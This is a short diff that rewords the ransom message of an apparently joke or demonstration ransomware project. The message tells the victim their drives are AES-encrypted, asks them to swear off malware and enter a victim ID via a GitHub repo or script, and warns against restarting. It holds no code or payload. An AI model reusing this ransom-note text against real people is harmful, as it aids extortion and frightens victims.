@@ -4,9 +4,9 @@ The drives of your computer have been encrypted with an advanced
 military grade encryption algorithm known as AES.
 However, the key used for encryption and decryption of your 
 harddisks has now been discarded and lost except for the victim ID
-used to get that key
+used to generate said key.
 
-The only way to retrieve this decryption key is by doing the following
+The only way to retrieve the decryption key is by doing the following
 3 steps below:
 
 1) Swear to god that you will not run any more malware!
@@ -15,6 +15,6 @@ repo on GitHub.
 3) Enter your victim ID (provided below) via the website or script and the
 decryption key will be provided.
 
-IMPORTANT: Once decryption begins, DO NOT restart or shutdown your device,
+IMPORTANT: Once decryption begins, DO NOT RESTART OR TURN OFF YOUR PC!
 
-Here is your personal victim ID:
+Personal victim ID:
